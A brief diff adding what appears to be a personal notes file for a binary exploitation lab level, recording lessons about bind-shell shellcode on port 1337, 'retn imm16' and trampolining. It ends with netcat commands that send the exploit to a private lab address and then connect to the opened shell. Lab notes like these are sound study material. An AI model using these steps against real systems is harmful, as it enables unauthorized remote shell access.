@@ -1,0 +1,15 @@
+What I learned:
+    - forgot that my shell code opens up a port listening on 1337 that will give you shell
+    - mnemonic retn imm16 will pop that many bytes off stack
+    - can use overflow bytes as means to execute code as well
+    - be careful when trampolining, be sure to execute bind shell code from the beginning and not hop into it accidentally!
+
+
+
+How to win:
+
+    python pwnlevel01.sh > exploit
+    cat exploit | nc 192.168.56.37 20001
+
+On another terminal
+    nc 192.168.56.37 1337  
